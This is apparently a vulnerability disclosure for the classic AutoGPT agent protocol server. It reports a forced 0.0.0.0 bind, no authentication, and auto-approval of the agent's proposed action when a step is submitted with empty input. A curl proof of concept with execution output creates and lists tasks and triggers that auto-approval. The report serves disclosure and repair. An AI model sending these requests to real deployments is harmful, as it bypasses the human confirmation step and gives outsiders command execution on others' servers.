# AutoGPT classic: agent protocol server forcibly binds 0.0.0.0 with zero authentication, enabling remote agent control

## Description

`autogpt/app/agent_protocol_server.py:122` forcibly overrides the bind address:

```python
config.bind = [f"0.0.0.0:{port}"]
logger.info(f"AutoGPT server starting on http://localhost:{port}")
```

This is a **forced override**, not a default — even if the user configures `127.0.0.1`, the code replaces it with `0.0.0.0`. The log message misleadingly reports "localhost" while the server is bound to all network interfaces.

The entire `/ap/v1` API surface has **zero authentication** — no token, no API key, no session check. The full text of `agent_protocol_server.py` contains 0 occurrences of `auth`, `Security`, `Depends`, or `APIKey`.

Additionally, the step execution logic at L216 auto-approves actions when input is empty:

```python
execute_approved = not user_input    # "" -> not "" -> True -> auto-execute
```

A remote attacker can POST a step with `{"input": ""}` and the agent's previously proposed action (which may include file operations or command execution) is automatically approved and executed.

## Impact

Any network client that can reach the port obtains full control of the AutoGPT agent:

- **Create tasks**: POST `/ap/v1/agent/tasks` — no credentials required
- **Enumerate all tasks**: GET `/ap/v1/agent/tasks` — including other users' tasks on shared deployments
- **Auto-approve agent actions**: POST with empty input — the agent's proposed commands (file reads/writes, code execution) are automatically approved without any confirmation
- **Remote code execution**: the agent's core capability is executing commands and file operations; controlling the agent loop from the network gives the attacker these capabilities with server privileges

The forced `0.0.0.0` override means the user **cannot** secure the deployment by configuring a loopback bind — the code overrides their choice.

## PoC

```bash
# Prerequisite: classic AutoGPT running (the documented CLI / Docker setup)
# Server is on 0.0.0.0:<port> (default 8000) — reachable from ANY network interface

# 1. Create a task (no auth):
curl -X POST "http://<host>:8000/ap/v1/agent/tasks" \
  -H "Content-Type: application/json" \
  -d '{"input": "list files in current directory"}'

# 2. Enumerate all tasks (no auth):
curl "http://<host>:8000/ap/v1/agent/tasks"

# 3. Submit a step with empty input (auto-approves agent's proposed action):
curl -X POST "http://<host>:8000/ap/v1/agent/tasks/<task_id>/steps" \
  -H "Content-Type: application/json" \
  -d '{"input": ""}'

# Verify remote reachability from another machine:
curl "http://<non-localhost-ip>:8000/ap/v1/agent/tasks"
```

## Execution result

```
=== bind verification ===
$ ss -tln | grep 8107
LISTEN 0 2048  0.0.0.0:8107  0.0.0.0:*    [EVIDENCE-A: forced 0.0.0.0 bind CONFIRMED]

=== unauthenticated task creation ===
POST /ap/v1/agent/tasks
{"input":"list files in current directory","task_id":"0fa11ba6-75f0-...","artifacts":[]}
[code 200]

=== unauthenticated task enumeration ===
GET /ap/v1/agent/tasks
{"tasks":[{...task from above...}],"pagination":{"total_items":1,...}}
[code 200]

=== remote reachability (non-loopback IP) ===
GET http://172.27.205.182:8107/ap/v1/agent/tasks
{"tasks":[{...same data...}]}   [remote 200]

=== auto-approval with empty input ===
POST /ap/v1/agent/tasks/<id>/steps {"input": ""}
{"status":"completed","output":"An error occurred while proposing the next action:
 Error code: 401 - ... Incorrect API key ..."}
[code 200]
(The 401 is from the fake OpenAI key in the repro env — the empty input was
 accepted, execute_approved became True, and the agent attempted to call the
 LLM to propose and execute the next action.)
```

The code path confirmed: `"" → not "" → True → execute_approved = True` — the agent's proposed action proceeds without any human confirmation.
